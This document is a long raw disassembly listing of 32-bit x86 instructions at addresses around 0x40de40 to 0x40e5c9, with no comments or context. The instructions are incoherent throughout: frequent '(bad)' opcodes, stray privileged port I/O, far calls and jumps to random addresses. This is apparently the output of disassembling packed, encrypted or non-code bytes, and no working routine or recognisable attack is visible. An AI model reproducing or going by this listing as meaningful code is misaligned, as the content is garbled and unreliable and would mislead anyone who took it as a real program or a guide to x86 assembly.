  40de40:	imul   ebp,DWORD PTR [ebx-0x61e421c4],0xaa603a88
  40de4a:	sahf   
  40de4b:	and    al,0xdf
  40de4d:	push   0xffffff9d
  40de4f:	cmp    ch,BYTE PTR [ecx]
  40de51:	cld    
  40de52:	repnz into 
  40de54:	xchg   BYTE PTR [edx+esi*4+0x6522c194],ch
  40de5b:	pop    esi
  40de5c:	icebp  
  40de5d:	out    0xb0,eax
  40de5f:	xchg   DWORD PTR gs:[eax+ecx*1-0x29422fad],ebx
  40de67:	in     eax,dx
  40de68:	xchg   edi,eax
  40de69:	adc    BYTE PTR [esi+0x104b276],0x39
  40de70:	retf   0xb8cf
  40de73:	sbb    DWORD PTR [ebp+0x34],esi
  40de76:	mov    ah,0xb5
  40de78:	push   0x73ea775d
  40de7d:	shr    BYTE PTR [eax-0x576cb3f9],1
  40de83:	shr    esi,1
  40de85:	mov    bl,0x24
  40de87:	shl    BYTE PTR [edx+0x36],cl
  40de8a:	inc    ebx
  40de8b:	(bad)  
  40de8c:	ror    edx,1
  40de8e:	popa   
  40de8f:	retf   
  40de90:	xor    ecx,DWORD PTR [edx+0x5110cd73]
  40de96:	inc    ecx
  40de97:	test   ecx,ebx
  40de99:	scas   eax,DWORD PTR es:[edi]
  40de9a:	jge    0x40df18
  40de9c:	sbb    ebp,ebx
  40de9e:	loop   0x40de32
  40dea0:	repz shr edx,1
  40dea3:	dec    ebx
  40dea4:	stc    
  40dea5:	xlat   BYTE PTR ds:[ebx]
  40dea6:	test   cl,bh
  40dea8:	xor    eax,0x48f98d4f
  40dead:	iret   
  40deae:	in     eax,0x71
  40deb0:	in     eax,0xba
  40deb2:	iret   
  40deb3:	jno    0x40def2
  40deb5:	add    eax,DWORD PTR [ebx+0x34]
  40deb8:	adc    eax,esi
  40deba:	mov    ds:0xfa1afdb,al
  40debf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dec0:	or     esi,edi
  40dec2:	pop    ds
  40dec3:	hlt    
  40dec4:	shr    DWORD PTR [edi+0x6afbd357],1
  40deca:	add    ah,BYTE PTR [ecx+eax*4-0x7d]
  40dece:	scas   al,BYTE PTR es:[edi]
  40decf:	dec    ebp
  40ded0:	jp     0x40de6f
  40ded2:	mov    eax,0x106b3126
  40ded7:	jno    0x40dec2
  40ded9:	mov    WORD PTR [ebx],fs
  40dedb:	lds    ebx,FWORD PTR cs:[edx]
  40dede:	xchg   ebx,eax
  40dedf:	push   0x507b34ce
  40dee4:	data16 adc al,0x90
  40dee7:	cs jmp 0x40def8
  40deea:	sbb    DWORD PTR [ecx-0x17],0xe67c36d4
  40def1:	ins    BYTE PTR es:[edi],dx
  40def2:	pop    ebp
  40def3:	mov    eax,0x1fe87d5f
  40def8:	in     al,dx
  40def9:	cmp    dl,BYTE PTR [ebp+0x9]
  40defc:	int    0x8a
  40defe:	hlt    
  40deff:	imul   eax,DWORD PTR [eax-0x64e5343b],0x1aa91f7a
  40df09:	jmp    0x40df2c
  40df0b:	es test al,0xad
  40df0e:	int3   
  40df0f:	lods   al,BYTE PTR ds:[esi]
  40df10:	rcr    DWORD PTR [ecx],0x47
  40df13:	xchg   ebx,eax
  40df14:	loop   0x40df0b
  40df16:	inc    esp
  40df17:	dec    esp
  40df18:	jo     0x40df43
  40df1a:	xor    DWORD PTR [ecx],eax
  40df1c:	je     0x40df6c
  40df1e:	les    eax,FWORD PTR [ebx+0x7aae8853]
  40df24:	push   esi
  40df25:	popa   
  40df26:	push   0xffffffd1
  40df28:	add    BYTE PTR [ebx],dh
  40df2a:	jno    0x40deb1
  40df2c:	adc    BYTE PTR [ebp-0x64],dl
  40df2f:	inc    ebx
  40df30:	push   ds
  40df31:	inc    edx
  40df32:	stos   DWORD PTR es:[edi],eax
  40df33:	add    DWORD PTR [eax+0x3a],esp
  40df36:	cmp    al,BYTE PTR [edi]
  40df38:	ror    BYTE PTR [edx+0x2479a3d3],0x6a
  40df3f:	dec    ebx
  40df40:	sar    BYTE PTR [edi-0x480a055e],cl
  40df46:	adc    DWORD PTR [eax-0x570635a1],edi
  40df4c:	adc    dl,BYTE PTR [esi+0x62]
  40df4f:	mov    al,BYTE PTR [ecx-0x7e]
  40df52:	fist   WORD PTR [ecx+0x73]
  40df55:	fdiv   QWORD PTR [eax+0x48]
  40df58:	dec    edi
  40df59:	mov    al,BYTE PTR [edx]
  40df5b:	into   
  40df5c:	(bad)  
  40df5d:	xor    esp,DWORD PTR [ecx+edx*8-0x59]
  40df61:	sub    al,0x8f
  40df63:	and    eax,0xadf4d50a
  40df68:	loope  0x40df0b
  40df6a:	loopne 0x40df31
  40df6c:	and    eax,0x8f75fea9
  40df71:	add    DWORD PTR [esi-0x2e],eax
  40df74:	xchg   esp,eax
  40df75:	ret    
  40df76:	and    ebp,ebx
  40df78:	mov    ah,0xb5
  40df7a:	xchg   ecx,eax
  40df7b:	bound  esi,QWORD PTR [esi-0x28494bb1]
  40df81:	jns    0x40df08
  40df83:	fwait
  40df84:	xor    DWORD PTR [ecx-0x51cc6066],edi
  40df8a:	jmp    0x40e00b
  40df8c:	pop    edi
  40df8d:	push   0xffffff8e
  40df8f:	cmp    BYTE PTR [esi],al
  40df91:	adc    al,0xc4
  40df93:	jb     0x40df43
  40df95:	pop    ss
  40df96:	adc    edx,DWORD PTR [edx-0x63]
  40df99:	bound  ebx,QWORD PTR [edi-0x25348a31]
  40df9f:	push   0xffffffe1
  40dfa1:	loop   0x40dfa9
  40dfa3:	(bad)  
  40dfa6:	adc    BYTE PTR [eax-0x7b],bl
  40dfa9:	(bad)  
  40dfaa:	scas   al,BYTE PTR es:[edi]
  40dfab:	and    dl,ch
  40dfad:	push   ebp
  40dfae:	xchg   DWORD PTR [ebp+0x6],ecx
  40dfb1:	pushf  
  40dfb2:	mov    ds:0x72b277d1,eax
  40dfb7:	push   eax
  40dfb8:	jb     0x40e035
  40dfba:	push   0x7f
  40dfbc:	jmp    0x7dfc62fc
  40dfc1:	rcr    BYTE PTR [esi-0x55],0x88
  40dfc5:	leave  
  40dfc6:	inc    edi
  40dfc7:	repnz xchg esi,eax
  40dfc9:	xor    eax,0x65e9b1fa
  40dfce:	mov    bl,0xaf
  40dfd0:	fxam   
  40dfd2:	aam    0xfe
  40dfd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfd5:	sbb    ah,BYTE PTR ds:0xa84bbfca
  40dfdb:	and    ch,BYTE PTR [eax]
  40dfdd:	inc    ebx
  40dfde:	pushf  
  40dfdf:	mov    esi,0x3d2f604d
  40dfe4:	fwait
  40dfe5:	push   ds
  40dfe6:	loop   0x40e04c
  40dfe8:	fwait
  40dfe9:	imul   ecx,DWORD PTR [ecx+0x43e101a],0x8f18648c
  40dff3:	pusha  
  40dff4:	test   BYTE PTR [edx-0x6f5a3d71],al
  40dffa:	push   edx
  40dffb:	mov    DWORD PTR ds:[edx-0x4fc39c3b],ecx
  40e002:	enter  0x5033,0xd7
  40e006:	cli    
  40e007:	xchg   esi,eax
  40e008:	call   0x4624724c
  40e00d:	sar    dh,cl
  40e00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e010:	div    DWORD PTR [edx+0x485d1826]
  40e016:	inc    ebx
  40e017:	std    
  40e018:	or     DWORD PTR [ecx-0x2],esi
  40e01b:	jno    0x40e031
  40e01d:	enter  0x911e,0xe9
  40e021:	push   edi
  40e022:	idiv   BYTE PTR [esi]
  40e024:	fbstp  TBYTE PTR [ecx*2+0x4e536816]
  40e02b:	in     al,0x4c
  40e02d:	pop    edi
  40e02f:	pop    edi
  40e030:	jle    0x40dffa
  40e032:	xor    ebx,0xffffffc5
  40e035:	cmp    al,BYTE PTR ds:0x8cb7d7a4
  40e03b:	inc    ebp
  40e03c:	stos   BYTE PTR es:[edi],al
  40e03d:	icebp  
  40e03e:	shr    ebx,0xa0
  40e041:	dec    eax
  40e042:	stos   BYTE PTR es:[edi],al
  40e043:	pop    edx
  40e044:	test   eax,0x6f7a248f
  40e049:	inc    esi
  40e04a:	xor    ah,BYTE PTR [ecx]
  40e04c:	dec    esi
  40e04d:	and    eax,0x81b03d31
  40e052:	nop
  40e053:	jbe    0x40e0ca
  40e055:	inc    ebx
  40e056:	rcl    BYTE PTR gs:[ebp-0x67],0x7e
  40e05b:	pop    eax
  40e05c:	dec    edx
  40e05d:	(bad)  
  40e05e:	js     0x40e04a
  40e060:	or     dh,BYTE PTR [ebp-0x728f0075]
  40e066:	sbb    dh,dh
  40e068:	mov    al,ds:0x8fc36511
  40e06d:	stos   DWORD PTR es:[edi],eax
  40e06e:	adc    ch,BYTE PTR [edx]
  40e070:	fnstsw WORD PTR [edx-0x25]
  40e073:	add    DWORD PTR [edx-0x2d],ebp
  40e076:	pop    ss
  40e077:	or     BYTE PTR [esp+edi*2],bh
  40e07a:	mov    BYTE PTR [esi-0x5f122a13],dh
  40e080:	xor    ah,BYTE PTR [edi]
  40e082:	add    al,0x84
  40e084:	add    al,0x31
  40e086:	jae    0x40e0a5
  40e088:	and    esi,ebp
  40e08a:	pop    ebx
  40e08b:	mov    bh,0x63
  40e08d:	aas    
  40e08e:	inc    ecx
  40e08f:	and    al,BYTE PTR [ecx+eax*4]
  40e092:	mov    esi,0x6e19f643
  40e097:	aaa    
  40e098:	add    dl,al
  40e09a:	sub    DWORD PTR [esi-0x6ffabe18],esp
  40e0a0:	pop    ss
  40e0a1:	int3   
  40e0a2:	cmp    eax,0x6879baad
  40e0a7:	in     al,dx
  40e0a8:	bswap  ebx
  40e0aa:	inc    eax
  40e0ab:	mov    esp,0x22fc41bb
  40e0b0:	scas   al,BYTE PTR es:[edi]
  40e0b1:	(bad)  
  40e0b3:	sub    esi,DWORD PTR [eax+ebp*8-0x5ad63651]
  40e0ba:	ret    
  40e0bb:	add    edx,edi
  40e0bd:	jb     0x40e098
  40e0bf:	inc    edx
  40e0c0:	sub    BYTE PTR [ebp-0x36],ch
  40e0c3:	cmp    eax,0x705de210
  40e0c8:	mov    ds:0x3eec330e,al
  40e0cd:	adc    bl,BYTE PTR [esi]
  40e0cf:	sbb    eax,0x1a1fbb3c
  40e0d4:	and    eax,0x9f3a01e6
  40e0d9:	popa   
  40e0da:	popa   
  40e0db:	push   esi
  40e0dc:	inc    esp
  40e0dd:	mov    bl,0xb3
  40e0df:	push   ecx
  40e0e0:	jl     0x40e063
  40e0e2:	mov    ah,ch
  40e0e4:	(bad)  
  40e0e6:	aam    0xd1
  40e0e8:	pop    esp
  40e0e9:	mov    al,ds:0x72e6295d
  40e0ee:	ror    BYTE PTR [edi-0x345b3bf0],cl
  40e0f4:	jge    0x40e07b
  40e0f6:	inc    edi
  40e0f7:	stos   BYTE PTR es:[edi],al
  40e0f8:	mov    edx,0x34e52076
  40e0fd:	xchg   ebp,eax
  40e0fe:	pop    edx
  40e0ff:	and    al,0x81
  40e101:	loop   0x40e11e
  40e103:	and    DWORD PTR [edi-0x47],ebp
  40e106:	sub    eax,0xf07412d5
  40e10b:	cmp    BYTE PTR [edx+0x5462f7e2],ch
  40e111:	icebp  
  40e112:	or     eax,0xc71fb6af
  40e117:	jmp    0x9095b2c7
  40e11c:	xchg   edx,eax
  40e11d:	into   
  40e11e:	addr16 mov ah,0x4d
  40e121:	loop   0x40e12e
  40e123:	pusha  
  40e124:	(bad)
  40e127:	add    al,0x36
  40e129:	xchg   bh,bl
  40e12b:	xchg   edx,eax
  40e12c:	dec    edx
  40e12d:	inc    ebp
  40e12e:	mov    bh,0xd7
  40e130:	pop    esi
  40e131:	fwait
  40e132:	loope  0x40e170
  40e134:	push   ds
  40e135:	(bad)  [esi]
  40e137:	xlat   BYTE PTR ds:[ebx]
  40e138:	aaa    
  40e139:	mov    esi,DWORD PTR [ebp-0x74aabe9c]
  40e13f:	push   es
  40e140:	dec    ebp
  40e141:	rcr    DWORD PTR [edi],cl
  40e143:	add    DWORD PTR [eax+0x6d],eax
  40e146:	loop   0x40e0eb
  40e148:	mov    BYTE PTR [ebx],dh
  40e14a:	test   DWORD PTR ds:0xf2d56210,0x10121925
  40e154:	cld    
  40e155:	loope  0x40e0f8
  40e157:	pop    edi
  40e158:	push   cs
  40e159:	in     eax,0x8d
  40e15b:	push   0x70
  40e15d:	sbb    al,0x48
  40e15f:	cld    
  40e160:	mov    eax,ds:0x2e0679c0
  40e165:	push   ebx
  40e166:	jmp    0x40e1b8
  40e168:	mov    ds:0x66c33d2f,eax
  40e16d:	and    eax,0x13fcd48b
  40e172:	inc    ecx
  40e173:	lock add eax,0x133b4e0
  40e179:	xor    DWORD PTR [ecx],esi
  40e17b:	sub    eax,0x4d9a80f5
  40e180:	dec    eax
  40e181:	cmc    
  40e182:	push   ecx
  40e183:	dec    eax
  40e184:	push   0x96548227
  40e189:	and    BYTE PTR [ebx+0x1164ee3d],bl
  40e18f:	sbb    edi,DWORD PTR gs:[ebp-0x722468c8]
  40e196:	enter  0xbf81,0xae
  40e19a:	add    DWORD PTR [eax-0x419f0c4f],esi
  40e1a0:	and    al,0x85
  40e1a2:	sub    ch,0x93
  40e1a5:	mov    edx,0xcc5e8c18
  40e1aa:	sbb    edi,esp
  40e1ac:	(bad)  
  40e1ad:	bound  edx,QWORD PTR [edx]
  40e1af:	int3   
  40e1b0:	pop    eax
  40e1b1:	add    bl,BYTE PTR [ebp+edx*4+0x4]
  40e1b5:	retf   0xbcae
  40e1b8:	cmp    al,0x5b
  40e1ba:	cmp    esp,eax
  40e1bc:	sub    BYTE PTR [ebx+0x2a],ch
  40e1bf:	fadd   st,st(4)
  40e1c1:	push   es
  40e1c2:	dec    eax
  40e1c3:	les    eax,FWORD PTR ds:0xb46aa0a2
  40e1c9:	push   esp
  40e1ca:	add    BYTE PTR [esi],dh
  40e1cc:	inc    edx
  40e1cd:	dec    ebx
  40e1ce:	pusha  
  40e1cf:	repnz xor ebx,esi
  40e1d2:	shr    DWORD PTR [ebp-0x60],cl
  40e1d5:	inc    DWORD PTR [ebx+0x75]
  40e1d8:	push   0xffffffe0
  40e1da:	sbb    BYTE PTR [esi],0xd5
  40e1dd:	jge    0x40e186
  40e1df:	test   DWORD PTR [edi+0xf],esp
  40e1e2:	das    
  40e1e3:	aad    0x9d
  40e1e5:	xor    DWORD PTR [ecx-0x3a],esp
  40e1e8:	(bad)  
  40e1e9:	cli    
  40e1ea:	cmp    eax,0x76396a26
  40e1ef:	push   edi
  40e1f0:	stos   BYTE PTR es:[edi],al
  40e1f1:	jnp    0x40e17f
  40e1f3:	mov    ebp,0x71462e42
  40e1f8:	add    ch,BYTE PTR ds:0xe3f3cd11
  40e1fe:	das    
  40e1ff:	sub    BYTE PTR [ebx+edx*2+0x66],bl
  40e203:	pop    edi
  40e204:	cmp    eax,0xf66c9add
  40e209:	(bad)  
  40e20a:	leave  
  40e20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e20c:	lock rol DWORD PTR ds:[ecx],0xc8
  40e211:	gs (bad) 
  40e213:	fbld   TBYTE PTR [ebp+0x63548ba4]
  40e219:	pop    ebx
  40e21a:	and    al,0xc3
  40e21c:	add    eax,0xf274ae06
  40e221:	sbb    DWORD PTR [ebp-0x4ef242d2],ebp
  40e227:	data16 jne 0x40e1c0
  40e22a:	inc    esi
  40e22b:	adc    DWORD PTR [ebp+ebx*1+0x5678a50d],esi
  40e232:	(bad)  
  40e233:	pusha  
  40e234:	call   0xb66e:0xacfe40f8
  40e23b:	jge    0x40e2af
  40e23d:	mov    eax,0x9aa463c
  40e242:	icebp  
  40e243:	fwait
  40e244:	dec    ecx
  40e245:	dec    edi
  40e246:	push   0xffffffaf
  40e248:	mov    ds:0x5f4f71de,al
  40e24d:	mov    esi,0x77555e2d
  40e252:	sub    eax,0x9f9ab88f
  40e257:	mov    eax,ds:0xe2eb1d46
  40e25c:	or     DWORD PTR ds:0x558a7a47,edx
  40e262:	add    esp,ebp
  40e264:	sar    eax,0x36
  40e267:	mov    esi,0x991bbcbb
  40e26c:	call   0x8413:0x79d35321
  40e273:	dec    ecx
  40e274:	ins    BYTE PTR es:[edi],dx
  40e275:	stos   DWORD PTR es:[edi],eax
  40e276:	leave  
  40e277:	dec    edi
  40e278:	xor    BYTE PTR [edi-0x6ad065c5],dl
  40e27e:	ss ss push esi
  40e281:	mov    ah,0xfb
  40e283:	xchg   ebp,eax
  40e284:	cmp    ah,al
  40e286:	mov    bl,0xa3
  40e288:	pop    edi
  40e289:	(bad)  
  40e28a:	(bad)  
  40e28b:	stos   BYTE PTR es:[edi],al
  40e28c:	jbe    0x40e28b
  40e28e:	xchg   edx,eax
  40e28f:	(bad)  
  40e290:	ja     0x40e296
  40e292:	test   DWORD PTR [eax+0x2d],ecx
  40e295:	mov    dl,BYTE PTR [ebx-0x52593b0d]
  40e29b:	pop    edi
  40e29c:	outs   dx,DWORD PTR ds:[esi]
  40e29d:	mov    BYTE PTR ds:0x959c47d3,dl
  40e2a3:	pop    edi
  40e2a4:	xchg   edx,eax
  40e2a5:	ret    0xe81f
  40e2a8:	arpl   si,bp
  40e2aa:	mov    dl,0xbc
  40e2ac:	jecxz  0x40e274
  40e2ae:	popa   
  40e2af:	neg    DWORD PTR [ecx-0x3e]
  40e2b2:	xchg   ebp,eax
  40e2b3:	ret    0x7703
  40e2b6:	mov    dl,al
  40e2b8:	sub    eax,0x228cccc5
  40e2bd:	push   eax
  40e2be:	xor    al,BYTE PTR [eax]
  40e2c0:	(bad)  
  40e2c1:	mov    edi,0x451a17dd
  40e2c6:	xchg   esp,eax
  40e2c7:	sahf   
  40e2c8:	neg    bl
  40e2ca:	mov    ecx,ebp
  40e2cc:	xor    eax,0xe280f4c6
  40e2d1:	and    BYTE PTR [ebx+eax*1+0x6],bh
  40e2d5:	mov    BYTE PTR [esi+ebx*8+0x7e],dh
  40e2d9:	ins    DWORD PTR es:[edi],dx
  40e2da:	cwde   
  40e2db:	push   cs
  40e2dc:	bound  edi,QWORD PTR [eax]
  40e2de:	call   0x3fe0ae2d
  40e2e3:	sub    al,0xc4
  40e2e5:	cmc    
  40e2e6:	loopne 0x40e2f8
  40e2e8:	nop
  40e2e9:	sti    
  40e2ea:	mov    esp,ebx
  40e2ec:	sub    DWORD PTR ss:[ebx-0x62b3891b],0x848c2b7b
  40e2f7:	into   
  40e2f8:	ficomp WORD PTR [ebp-0x23]
  40e2fb:	inc    ebx
  40e2fc:	fstp   QWORD PTR [ebp+0x7c]
  40e2ff:	in     eax,dx
  40e300:	jle    0x40e348
  40e302:	mov    eax,ds:0x217ad76a
  40e307:	sbb    eax,ebp
  40e309:	leave  
  40e30a:	sbb    DWORD PTR [ebx+0x329c6aa8],eax
  40e310:	pop    ebp
  40e311:	jp     0x40e2f2
  40e313:	push   ss
  40e314:	aaa    
  40e315:	repnz pop ebx
  40e317:	sbb    WORD PTR [edx],sp
  40e31a:	cwde   
  40e31b:	xchg   esp,eax
  40e31c:	lods   al,BYTE PTR ds:[esi]
  40e31d:	aaa    
  40e31e:	sbb    esp,0x43
  40e321:	jg     0x40e312
  40e323:	ret    0x86d3
  40e326:	cmp    eax,0x5c70c599
  40e32b:	mov    cl,0x9c
  40e32d:	stos   BYTE PTR es:[edi],al
  40e32e:	fdivp  st(4),st
  40e330:	ja     0x40e300
  40e332:	mov    edi,0x3c897c22
  40e337:	add    ch,BYTE PTR ds:[ecx+0x38bea97c]
  40e33e:	shl    DWORD PTR [edi-0x8],1
  40e341:	repnz fcomp DWORD PTR [edi+edx*8]
  40e345:	sub    DWORD PTR [ebx-0x374701bc],ecx
  40e34b:	retf   
  40e34c:	(bad)  
  40e34d:	mov    dl,0x52
  40e34f:	addr16 jmp 0x40e3b0
  40e352:	test   edx,esp
  40e354:	mov    ah,0x26
  40e356:	loopne 0x40e3a2
  40e358:	sbb    bh,dh
  40e35a:	xor    al,BYTE PTR [edi]
  40e35c:	(bad)  [eax+0x42e7f271]
  40e362:	sbb    DWORD PTR [eax],esi
  40e364:	mov    cl,0xde
  40e366:	imul   esp,esp,0x3971f873
  40e36c:	gs shr ah,cl
  40e36f:	data16 data16 (bad) 
  40e372:	out    0xe1,eax
  40e374:	(bad)  
  40e375:	lahf   
  40e376:	pushf  
  40e377:	mov    ch,0x6b
  40e379:	or     dh,BYTE PTR ds:0x486f2812
  40e37f:	test   eax,0x8a9e990e
  40e384:	and    eax,0x5cbb9e36
  40e389:	mov    edx,0xef59e76f
  40e38e:	mov    al,ds:0x2cbeda35
  40e393:	inc    ebx
  40e394:	cmp    dl,BYTE PTR [eax+esi*8]
  40e397:	cld    
  40e398:	cwde   
  40e399:	fnstenv [ebx]
  40e39b:	mov    ?,eax
  40e39d:	or     DWORD PTR [bp+di-0x34],0x50
  40e3a2:	sub    DWORD PTR [esi],0x51
  40e3a5:	xchg   DWORD PTR [ecx],eax
  40e3a7:	mov    ah,0xb
  40e3a9:	cmp    BYTE PTR [ebx+ecx*1],al
  40e3ac:	call   0xd8be:0x22f6c23c
  40e3b3:	int    0x9f
  40e3b5:	test   DWORD PTR [edi],ebx
  40e3b7:	xchg   ecx,eax
  40e3b8:	dec    edi
  40e3b9:	or     BYTE PTR [eax-0x29],al
  40e3bc:	jae    0x40e385
  40e3be:	ja     0x40e3a9
  40e3c0:	push   ebx
  40e3c1:	imul   eax,DWORD PTR [edi+ebp*2+0x73524caa],0x86edcc94
  40e3cc:	ins    BYTE PTR es:[edi],dx
  40e3cd:	outs   dx,BYTE PTR ds:[esi]
  40e3ce:	pop    edx
  40e3cf:	pop    ebx
  40e3d0:	and    bh,BYTE PTR [ebp+ebp*1-0x76aa1b0e]
  40e3d7:	lock stos BYTE PTR es:[edi],al
  40e3d9:	add    bh,BYTE PTR [ebp+0x6acd6d3]
  40e3df:	or     eax,DWORD PTR [esi-0x46a7edff]
  40e3e5:	pop    esi
  40e3e6:	add    BYTE PTR [esi],dl
  40e3e8:	sbb    eax,0xc1cd86e5
  40e3ed:	(bad)  
  40e3ee:	xchg   esi,eax
  40e3ef:	jmp    0x40e3c1
  40e3f1:	xor    eax,0x9fe8aa8f
  40e3f6:	push   0x1a895140
  40e3fb:	cmp    BYTE PTR [esi+0x66],dh
  40e3fe:	ficomp DWORD PTR [ebx-0x7e]
  40e401:	xor    ecx,eax
  40e403:	(bad)  
  40e404:	call   0x8181837d
  40e409:	call   0xcf2dd9ae
  40e40e:	hlt    
  40e40f:	out    dx,al
  40e410:	arpl   WORD PTR [eax+0x7e],sp
  40e413:	sub    al,0x21
  40e415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e416:	imul   esp,DWORD PTR [edi+0x36c9e006],0x558ba477
  40e420:	inc    edi
  40e421:	xchg   esi,eax
  40e422:	(bad)  [eax]
  40e424:	jbe    0x40e412
  40e426:	icebp  
  40e427:	out    dx,al
  40e428:	sti    
  40e429:	ror    DWORD PTR [esi+ebx*4],1
  40e42c:	shl    DWORD PTR [ebx-0x23],cl
  40e42f:	out    dx,eax
  40e430:	mov    ebx,0x293594b0
  40e435:	push   cs
  40e436:	push   DWORD PTR ds:0xa5841880
  40e43c:	push   ecx
  40e43d:	pop    ds
  40e43e:	xchg   esp,eax
  40e43f:	pop    edi
  40e440:	fwait
  40e441:	retf   0x4c06
  40e444:	jo     0x40e408
  40e446:	inc    ebx
  40e447:	xchg   BYTE PTR ds:0x9b1b698,bl
  40e44d:	push   ss
  40e44e:	in     eax,dx
  40e44f:	or     al,0x85
  40e451:	xor    esp,DWORD PTR [edi-0x71ec80e6]
  40e457:	out    0x33,al
  40e459:	out    dx,eax
  40e45a:	mov    WORD PTR [eax],ss
  40e45c:	lds    edx,FWORD PTR [eax-0x2b]
  40e45f:	neg    DWORD PTR [esi]
  40e461:	push   ecx
  40e462:	pop    edi
  40e463:	adc    BYTE PTR ds:0x3b985af9,dl
  40e469:	mov    DWORD PTR [esi],ebx
  40e46b:	fwait
  40e46c:	out    dx,eax
  40e46d:	pop    ds
  40e46e:	push   ecx
  40e46f:	in     eax,0x4
  40e471:	mov    eax,0xf6ad6df8
  40e476:	sbb    al,0x4f
  40e478:	das    
  40e479:	sbb    dl,BYTE PTR [ebx+0x21]
  40e47c:	(bad)  
  40e47d:	adc    ecx,esi
  40e47f:	mov    ebp,0xa4b519e3
  40e484:	int    0x25
  40e486:	push   edi
  40e487:	call   0x109e:0xadcb80ee
  40e48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e48f:	pop    ss
  40e490:	inc    ecx
  40e491:	loopne 0x40e420
  40e493:	adc    ebx,DWORD PTR [edi]
  40e495:	cs adc eax,0x937ef52d
  40e49b:	idiv   BYTE PTR [eax]
  40e49d:	jb     0x40e51a
  40e49f:	xchg   ebp,eax
  40e4a0:	mov    bh,0x7e
  40e4a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4a3:	daa    
  40e4a4:	je     0x40e447
  40e4a6:	and    BYTE PTR [ecx],ah
  40e4a8:	pop    ds
  40e4a9:	test   al,0x7c
  40e4ab:	(bad)  
  40e4ac:	in     eax,dx
  40e4ad:	fimul  DWORD PTR [esi-0x7f]
  40e4b0:	or     bh,BYTE PTR [edi+0x36caa962]
  40e4b6:	mov    al,0x23
  40e4b8:	adc    eax,DWORD PTR [edi+0x9c6722c]
  40e4be:	jg     0x40e504
  40e4c0:	pop    ebx
  40e4c1:	scas   eax,DWORD PTR es:[edi]
  40e4c2:	xor    ch,ch
  40e4c4:	in     al,0x1a
  40e4c6:	retf   
  40e4c7:	icebp  
  40e4c8:	loope  0x40e4a9
  40e4ca:	and    edx,DWORD PTR [edx]
  40e4cc:	stos   BYTE PTR es:[edi],al
  40e4cd:	mov    ebx,0xc869b119
  40e4d2:	inc    eax
  40e4d3:	call   0xd41b6921
  40e4d8:	out    0xb,eax
  40e4da:	lock add bl,dl
  40e4dd:	xor    DWORD PTR es:0x3a45b7ed,esi
  40e4e4:	imul   eax,DWORD PTR [edx],0xffffff8d
  40e4e7:	fist   WORD PTR [edx+0x70]
  40e4ea:	(bad)  
  40e4eb:	jmp    DWORD PTR [edx-0x6bce07fa]
  40e4f1:	scas   al,BYTE PTR es:[edi]
  40e4f2:	std    
  40e4f3:	enter  0x85d7,0xfa
  40e4f7:	dec    edi
  40e4f8:	stos   DWORD PTR es:[edi],eax
  40e4f9:	jecxz  0x40e517
  40e4fb:	jp     0x40e49c
  40e4fd:	out    0xfb,al
  40e4ff:	inc    eax
  40e500:	out    dx,al
  40e501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e502:	retf   0x6ef8
  40e505:	pop    esp
  40e506:	push   edx
  40e507:	inc    esi
  40e508:	(bad)  
  40e509:	inc    eax
  40e50a:	dec    eax
  40e50b:	in     al,dx
  40e50c:	mov    eax,0xec4304de
  40e511:	(bad)  
  40e512:	aam    0xd0
  40e514:	jmp    0xaecbe6c9
  40e519:	mov    ch,0xc7
  40e51b:	jecxz  0x40e562
  40e51d:	nop
  40e51e:	inc    eax
  40e51f:	pop    ecx
  40e520:	pushf  
  40e521:	out    dx,eax
  40e522:	pop    edi
  40e523:	and    al,0x3d
  40e525:	in     al,dx
  40e526:	add    BYTE PTR [ebx-0x43e2ae14],dh
  40e52c:	popa   
  40e52d:	mov    ?,edi
  40e52f:	out    0xfc,al
  40e531:	xor    dh,dh
  40e533:	retf   
  40e534:	sbb    ebp,ecx
  40e536:	dec    ecx
  40e537:	test   DWORD PTR [esi+0x2d],edx
  40e53a:	mov    ecx,ecx
  40e53c:	arpl   WORD PTR [esi],ax
  40e53e:	mov    BYTE PTR [edx+0x4caec867],ah
  40e544:	xchg   BYTE PTR [ecx-0x24af40ae],ah
  40e54a:	jmp    0x40e4e6
  40e54c:	inc    edx
  40e54d:	stc    
  40e54e:	adc    al,dh
  40e550:	fiadd  WORD PTR [edi-0x2f96335d]
  40e556:	push   eax
  40e557:	mov    ebp,0xdd757b3b
  40e55c:	test   DWORD PTR [esi+0x403ec2e8],ebp
  40e562:	stos   DWORD PTR es:[edi],eax
  40e563:	rol    DWORD PTR [esi-0x50cc055],1
  40e569:	and    al,0x0
  40e56b:	sub    bl,BYTE PTR [eax-0x36]
  40e56e:	cwde   
  40e56f:	popf   
  40e570:	out    dx,al
  40e571:	cli    
  40e572:	outs   dx,BYTE PTR ds:[esi]
  40e573:	(bad)  
  40e574:	mov    edi,0xecb79b95
  40e579:	cmp    DWORD PTR [ebx],edi
  40e57b:	fld    DWORD PTR [eax+0x51]
  40e57e:	retf   
  40e57f:	push   0x2b135a0
  40e584:	stc    
  40e585:	dec    ebx
  40e586:	std    
  40e587:	sbb    edx,DWORD PTR [ebp+0x6d]
  40e58a:	enter  0x9a12,0x8f
  40e58e:	ins    DWORD PTR es:[edi],dx
  40e58f:	(bad)  
  40e590:	mov    bh,0x61
  40e592:	sub    al,0x4d
  40e594:	add    al,0x1e
  40e596:	dec    eax
  40e597:	ins    DWORD PTR es:[edi],dx
  40e598:	ds dec esp
  40e59a:	ss xchg esi,eax
  40e59c:	xor    DWORD PTR [ebx],ecx
  40e59e:	aad    0x34
  40e5a0:	mov    ebx,0x99f80938
  40e5a5:	retf   
  40e5a6:	daa    
  40e5a7:	mov    ebx,0xc21bca2f
  40e5ac:	mov    bh,0x31
  40e5ae:	aad    0xe1
  40e5b0:	ret    
  40e5b1:	or     al,0x70
  40e5b3:	push   ebp
  40e5b4:	out    0xa6,eax
  40e5b6:	push   edi
  40e5b7:	xchg   esp,eax
  40e5b8:	cmp    eax,0xc6d361d2
  40e5bd:	adc    edi,DWORD PTR [eax-0x1b]
  40e5c0:	mov    ch,0x5d
  40e5c2:	sbb    ecx,DWORD PTR [ebx]
  40e5c4:	ss ja  0x40e62c
  40e5c7:	cmp    esi,ebp
  40e5c9:	dec    ebx
